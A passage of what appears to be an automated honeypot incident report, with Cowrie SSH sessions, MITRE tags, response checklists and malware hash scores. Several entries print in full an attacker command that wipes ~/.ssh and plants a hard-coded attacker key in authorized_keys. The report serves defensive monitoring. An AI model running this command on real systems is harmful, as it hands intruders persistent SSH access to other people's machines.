| `2026-04-16 10:16:21` | `cowrie.session.params` |
| `2026-04-16 10:16:21` | `cowrie.command.input` |
| `2026-04-16 10:16:22` | `cowrie.session.file_download` |
| `2026-04-16 10:16:22` | `cowrie.log.closed` |
| `2026-04-16 10:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b30f732b0da2

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 10:16 |
| **Last Seen** | 2026-04-16 10:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 10:16:25` | `cowrie.session.connect` |
| `2026-04-16 10:16:25` | `cowrie.client.version` |
| `2026-04-16 10:16:25` | `cowrie.client.kex` |
| `2026-04-16 10:16:26` | `cowrie.login.success` |
| `2026-04-16 10:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be0eb699a246

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 10:18 |
| **Last Seen** | 2026-04-16 10:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 10:18:28` | `cowrie.session.connect` |
| `2026-04-16 10:18:28` | `cowrie.client.version` |
| `2026-04-16 10:18:28` | `cowrie.client.kex` |
| `2026-04-16 10:18:29` | `cowrie.login.success` |
| `2026-04-16 10:18:29` | `cowrie.session.params` |
| `2026-04-16 10:18:29` | `cowrie.command.input` |
| `2026-04-16 10:18:29` | `cowrie.command.failed` |
| `2026-04-16 10:18:29` | `cowrie.log.closed` |
| `2026-04-16 10:18:30` | `cowrie.session.params` |
| `2026-04-16 10:18:30` | `cowrie.command.input` |
| `2026-04-16 10:18:30` | `cowrie.session.file_download` |
| `2026-04-16 10:18:30` | `cowrie.log.closed` |
| `2026-04-16 10:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f351ceb09a25

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 10:18 |
| **Last Seen** | 2026-04-16 10:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 10:18:32` | `cowrie.session.connect` |
| `2026-04-16 10:18:32` | `cowrie.client.version` |
| `2026-04-16 10:18:32` | `cowrie.client.kex` |
| `2026-04-16 10:18:33` | `cowrie.login.success` |
| `2026-04-16 10:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bf336aa1bed

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 10:22 |
| **Last Seen** | 2026-04-16 10:22 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 10:22:28` | `cowrie.session.connect` |
| `2026-04-16 10:22:28` | `cowrie.client.version` |
| `2026-04-16 10:22:29` | `cowrie.client.kex` |
| `2026-04-16 10:22:29` | `cowrie.login.success` |
| `2026-04-16 10:22:30` | `cowrie.session.params` |
| `2026-04-16 10:22:30` | `cowrie.command.input` |
| `2026-04-16 10:22:30` | `cowrie.command.failed` |
| `2026-04-16 10:22:30` | `cowrie.log.closed` |
| `2026-04-16 10:22:30` | `cowrie.session.params` |
| `2026-04-16 10:22:30` | `cowrie.command.input` |
| `2026-04-16 10:22:30` | `cowrie.session.file_download` |
| `2026-04-16 10:22:30` | `cowrie.log.closed` |
| `2026-04-16 10:22:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f8a65f5ef3d

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 10:22 |
| **Last Seen** | 2026-04-16 10:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 10:22:33` | `cowrie.session.connect` |
| `2026-04-16 10:22:33` | `cowrie.client.version` |
| `2026-04-16 10:22:33` | `cowrie.client.kex` |
| `2026-04-16 10:22:34` | `cowrie.login.success` |
| `2026-04-16 10:22:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd2e36405994

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 10:28 |
| **Last Seen** | 2026-04-16 10:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 10:28:36` | `cowrie.session.connect` |
| `2026-04-16 10:28:36` | `cowrie.client.version` |
| `2026-04-16 10:28:36` | `cowrie.client.kex` |
| `2026-04-16 10:28:37` | `cowrie.login.success` |
| `2026-04-16 10:28:37` | `cowrie.session.params` |
| `2026-04-16 10:28:37` | `cowrie.command.input` |
| `2026-04-16 10:28:37` | `cowrie.command.failed` |
| `2026-04-16 10:28:38` | `cowrie.log.closed` |
| `2026-04-16 10:28:38` | `cowrie.session.params` |
| `2026-04-16 10:28:38` | `cowrie.command.input` |
| `2026-04-16 10:28:38` | `cowrie.session.file_download` |
| `2026-04-16 10:28:38` | `cowrie.log.closed` |
| `2026-04-16 10:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ee1f8b938fb

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 10:28 |
| **Last Seen** | 2026-04-16 10:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 10:28:41` | `cowrie.session.connect` |
| `2026-04-16 10:28:41` | `cowrie.client.version` |
| `2026-04-16 10:28:41` | `cowrie.client.kex` |
| `2026-04-16 10:28:41` | `cowrie.login.success` |
| `2026-04-16 10:28:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-436e6553fd77

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 10:32 |
| **Last Seen** | 2026-04-16 10:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 10:32:50` | `cowrie.session.connect` |
| `2026-04-16 10:32:50` | `cowrie.client.version` |
| `2026-04-16 10:32:50` | `cowrie.client.kex` |
| `2026-04-16 10:32:50` | `cowrie.login.success` |
| `2026-04-16 10:32:51` | `cowrie.session.params` |
| `2026-04-16 10:32:51` | `cowrie.command.input` |
| `2026-04-16 10:32:51` | `cowrie.command.failed` |
| `2026-04-16 10:32:51` | `cowrie.log.closed` |
| `2026-04-16 10:32:51` | `cowrie.session.params` |
| `2026-04-16 10:32:51` | `cowrie.command.input` |
| `2026-04-16 10:32:52` | `cowrie.session.file_download` |
| `2026-04-16 10:32:52` | `cowrie.log.closed` |
| `2026-04-16 10:32:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e042aa8b7747

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 10:32 |
| **Last Seen** | 2026-04-16 10:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 10:32:54` | `cowrie.session.connect` |
| `2026-04-16 10:32:54` | `cowrie.client.version` |
| `2026-04-16 10:32:54` | `cowrie.client.kex` |
| `2026-04-16 10:32:55` | `cowrie.login.success` |
| `2026-04-16 10:32:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-553d3dc85c46

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 10:37 |
| **Last Seen** | 2026-04-16 10:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 10:37:01` | `cowrie.session.connect` |
| `2026-04-16 10:37:01` | `cowrie.client.version` |
| `2026-04-16 10:37:01` | `cowrie.client.kex` |
| `2026-04-16 10:37:02` | `cowrie.login.success` |
| `2026-04-16 10:37:02` | `cowrie.session.params` |
| `2026-04-16 10:37:02` | `cowrie.command.input` |
| `2026-04-16 10:37:02` | `cowrie.command.failed` |
| `2026-04-16 10:37:02` | `cowrie.log.closed` |
| `2026-04-16 10:37:03` | `cowrie.session.params` |
| `2026-04-16 10:37:03` | `cowrie.command.input` |
| `2026-04-16 10:37:03` | `cowrie.session.file_download` |
| `2026-04-16 10:37:03` | `cowrie.log.closed` |
| `2026-04-16 10:37:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-109995a94f81

| Field | Detail |
|---|---|
| **Source IP** | `110.38.234[.]220` |
| **First Seen** | 2026-04-16 10:37 |
| **Last Seen** | 2026-04-16 10:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 10:37:05` | `cowrie.session.connect` |
| `2026-04-16 10:37:05` | `cowrie.client.version` |
| `2026-04-16 10:37:05` | `cowrie.client.kex` |
| `2026-04-16 10:37:06` | `cowrie.login.success` |
| `2026-04-16 10:37:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.38.234[.]220` to AbuseIPDB if not already reported
- [ ] Block `110.38.234[.]220` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5d8d5efc4e1

| Field | Detail |
|---|---|
| **Source IP** | `218.78.132[.]164` |
| **First Seen** | 2026-04-16 10:38 |
| **Last Seen** | 2026-04-16 10:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 10:38:14` | `cowrie.session.connect` |
| `2026-04-16 10:38:14` | `cowrie.client.version` |
| `2026-04-16 10:38:14` | `cowrie.client.kex` |
| `2026-04-16 10:38:15` | `cowrie.login.success` |
| `2026-04-16 10:38:15` | `cowrie.session.params` |
| `2026-04-16 10:38:15` | `cowrie.command.input` |
| `2026-04-16 10:38:15` | `cowrie.command.failed` |
| `2026-04-16 10:38:15` | `cowrie.log.closed` |
| `2026-04-16 10:38:16` | `cowrie.session.params` |
| `2026-04-16 10:38:16` | `cowrie.command.input` |
| `2026-04-16 10:38:16` | `cowrie.session.file_download` |
| `2026-04-16 10:38:16` | `cowrie.log.closed` |
| `2026-04-16 10:38:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.78.132[.]164` to AbuseIPDB if not already reported
- [ ] Block `218.78.132[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c019e6ed859

| Field | Detail |
|---|---|
| **Source IP** | `218.78.132[.]164` |
| **First Seen** | 2026-04-16 10:38 |
| **Last Seen** | 2026-04-16 10:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 10:38:18` | `cowrie.session.connect` |
| `2026-04-16 10:38:18` | `cowrie.client.version` |
| `2026-04-16 10:38:18` | `cowrie.client.kex` |
| `2026-04-16 10:38:18` | `cowrie.login.success` |
| `2026-04-16 10:38:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.78.132[.]164` to AbuseIPDB if not already reported
- [ ] Block `218.78.132[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1ed5f9526bc

| Field | Detail |
|---|---|
| **Source IP** | `120.48.36[.]106` |
| **First Seen** | 2026-04-16 10:39 |
| **Last Seen** | 2026-04-16 10:39 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 10:39:31` | `cowrie.session.connect` |
| `2026-04-16 10:39:31` | `cowrie.client.version` |
| `2026-04-16 10:39:46` | `cowrie.client.kex` |
| `2026-04-16 10:39:55` | `cowrie.login.success` |
| `2026-04-16 10:39:59` | `cowrie.session.params` |
| `2026-04-16 10:39:59` | `cowrie.command.input` |
| `2026-04-16 10:39:59` | `cowrie.log.closed` |
| `2026-04-16 10:39:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.36[.]106` to AbuseIPDB if not already reported
- [ ] Block `120.48.36[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `110.38.234[.]220` | **25** | 2026-04-16 09:47 | 2026-04-16 10:37 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `3.131.220[.]121` | **3** | 2026-04-16 10:37 | 2026-04-16 10:41 | 0m | 3 | `T1110.001` | 🟢 LOW |
| `118.196.92[.]128` | **2** | 2026-04-16 10:14 | 2026-04-16 10:16 | 2m | 0 | `T1592` | 🟢 LOW |
| `172.202.117[.]221` | **2** | 2026-04-16 10:04 | 2026-04-16 10:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.67[.]70` | 1 | 2026-04-16 09:48 | 2026-04-16 09:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `114.220.176[.]69` | 1 | 2026-04-16 09:44 | 2026-04-16 09:45 | 49s | 0 | `T1592` | 🟢 LOW |
| `120.48.36[.]106` | 1 | 2026-04-16 10:39 | 2026-04-16 10:39 | 2s | 0 | `T1592` | 🟢 LOW |
| `161.132.51[.]203` | 1 | 2026-04-16 10:30 | 2026-04-16 10:30 | 8s | 0 | `T1592` | 🟢 LOW |
| `183.195.131[.]206` | 1 | 2026-04-16 09:45 | 2026-04-16 09:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `212.115.54[.]84` | 1 | 2026-04-16 09:43 | 2026-04-16 09:43 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.78.132[.]164` | 1 | 2026-04-16 10:38 | 2026-04-16 10:38 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.212.217[.]15` | 1 | 2026-04-16 09:45 | 2026-04-16 09:47 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
